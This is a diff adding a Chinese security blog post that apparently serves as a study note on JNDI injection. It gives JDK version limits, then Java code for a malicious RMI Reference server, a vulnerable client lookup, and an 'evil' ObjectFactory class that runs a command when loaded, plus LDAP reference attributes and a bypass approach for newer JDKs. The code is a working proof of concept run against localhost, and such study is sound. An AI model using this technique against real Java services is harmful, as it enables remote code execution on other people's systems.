+6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
+<li>JDK
+6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>
+</ul>
+<h2 id="rmi-利用">RMI 利用</h2>
+<h3 id="低版本">低版本</h3>
+<p>首先编写客户端和服务端代码，假定 Reference 的 location
+可控，那么一份客户端代码可能如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.rmi.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">location</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, NamingException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;RMIEvilClass&quot;</span>, <span class="string">&quot;RMIEvilClass&quot;</span>, location);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;ref&quot;</span>, refWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里 location 端口选择 8000 是因为 Python 的 <code>http.server</code>
+的默认启动端口是 8000。</p>
+<p>而客户端那边省略无关代码，剩下的框架如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.rmi.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) <span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/ref&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>远程利用的情况下（通过可控 location
+下载字节码），需要<strong>新建一个模块进行复现</strong>，在新建的模块中编写恶意类代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIEvilClass</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在不开启 <code>http.server</code>
+的情况下，客户端可以成功运行，但不会执行恶意类代码（因为找不到）。</p>
+<p>在开启 <code>http.server</code> 的情况下，客户端看可以成功运行，会从
+location 下载字节码，可以观察到日志如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::ffff:127.0.0.1 - - [24/Apr/2024 20:04:21] &quot;GET /RMIEvilClass.class HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+<p>需要知道的是，实例化类时加载优先级为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">静态块&gt;IIB块&gt;构造函数&gt;getObjectInstance</span><br></pre></td></tr></table></figure>
+<p>由于 <code>getObjectInstance</code> 返回值为 <code>null</code>，故
+<code>lookup</code> 结果为 <code>null</code>。</p>
+<h3 id="高版本">高版本</h3>
+<p>为了绕过这里 ConfigurationException 的限制，我们有三种方法:</p>
+<ol type="1">
+<li>令 <code>ref</code> 为空</li>
+<li>令 <code>ref.getFactoryClassLocation</code>() 为空</li>
+<li>令 <code>trustURLCodebase</code> 为 <code>true</code></li>
+</ol>
+<p>第一种为空会导致无法实例化远程
+RMI，第三种为空不太现实，这时只能选择第二种方法。</p>
+<p>此时选择 <code>org.apache.naming.factory.BeanFactory</code>，这是
+tomcat 会使用到的工厂类，用于实例化 bean。</p>
+<h2 id="ldap-利用">LDAP 利用</h2>
+<h3 id="低版本-1">低版本</h3>
+<p>LDAP 服务作为一个树形数据库，可以通过一些特殊的属性来实现 Java
+对象的存储。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ObjectClass: javaNamingReference</span><br><span class="line">javaCodebase: http:<span class="comment">//localhost:8000/</span></span><br><span class="line">JavaFactory: RMIEvilClass</span><br><span class="line">javaClassName: RMIEvilClass</span><br></pre></td></tr></table></figure>
+<p>这就相当于 RMI 中的 Reference，配置其中的
+<code>className</code>，<code>classFactory</code> 饿
+<code>classFactoryLocation</code>，其实本质与 RMI 服务器无差异。</p>
+<h3 id="高版本-1">高版本</h3>
+<h1 id="参考">参考</h1>
+<p><a target="_blank" rel="noopener" href="https://johnfrod.top/%e5%ae%89%e5%85%a8/%e9%ab%98%e4%bd%8ejdk%e7%89%88%e6%9c%ac%e4%b8%adjndi%e6%b3%a8%e5%85%a5/">高低版本
+JNDI 注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://fynch3r.github.io/%E6%90%9E%E6%87%82JNDI/">JNDI
+注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://johnfrod.top/%e5%ae%89%e5%85%a8/jndi%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/">JNDI
+注入漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8214">JNDI 注入学习</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>qsdz
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://hasegawaazusa.github.io/jndi-injection-note.html" title="JNDI注入笔记">https://hasegawaazusa.github.io/jndi-injection-note.html</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"><i class="fa fa-tag"></i> java</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/java-unserialize-note.html" rel="prev" title="java反序列化笔记">
+                  <i class="fa fa-chevron-left"></i> java反序列化笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/shiro-note.html" rel="next" title="shiro笔记">
+                  shiro笔记 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">863k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">13:04</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
